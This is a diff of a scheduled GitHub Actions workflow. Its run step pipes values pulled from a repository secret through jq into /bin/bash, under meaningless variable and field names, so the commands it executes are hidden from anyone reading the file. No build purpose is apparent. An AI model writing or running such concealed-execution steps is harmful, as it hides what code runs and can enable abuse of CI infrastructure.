@@ -1,10 +1,10 @@
 name: fangziwenni
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
-
-jobs:  # 1295
+    - cron: '52 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +12,15 @@ jobs:  # 1295
       - uses: actions/checkout@v4
       - name: fangziwenni
         env:
-          ob26772: ${{ secrets.ob26772 }}
+          czop1: ${{ secrets.czop1 }}
         run: |
-          echo $ob26772 | jq -r .dbyh3 | /bin/bash
-          echo $hrfr58 | jq -r .wxlks392 | /bin/bash
-          echo $dmew2930 | jq -r .l6 | /bin/bash
-          echo $hf8316 | jq -r .b689 | /bin/bash
-          echo $yn2788 | jq -r .cwtxf3 | /bin/bash
-          echo $le4 | jq -r .rdvqv7 | /bin/bash
-          echo $spt76 | jq -r .z5 | /bin/bash
-          echo $fv96 | jq -r .yyvj1 | /bin/bash
-          echo $jov1484 | jq -r .z0 | /bin/bash
-          echo $byhjo653 | jq -r .ajtpt486 | /bin/bash
-          echo $utzp9 | jq -r .k93099 | /bin/bash
-          echo $yryo1 | jq -r .siv276 | /bin/bash
-          echo $x38 | jq -r .vsa6 | /bin/bash
-          echo $okr7680 | jq -r .que9 | /bin/bash
+          echo $czop1 | jq -r .irlpm91 | /bin/bash
+          echo $vmiwo7 | jq -r .tc357 | /bin/bash
+          echo $lg763 | jq -r .zri503 | /bin/bash
+          echo $fk4263 | jq -r .fc14020 | /bin/bash
+          echo $yo8891 | jq -r .kaya1 | /bin/bash
+          echo $wxk07 | jq -r .omfag9139 | /bin/bash
+          echo $wpeb5 | jq -r .yhvj46090 | /bin/bash
+          echo $fpipi1 | jq -r .qpa0951 | /bin/bash
+          echo $oe59280 | jq -r .hurrq69 | /bin/bash
 
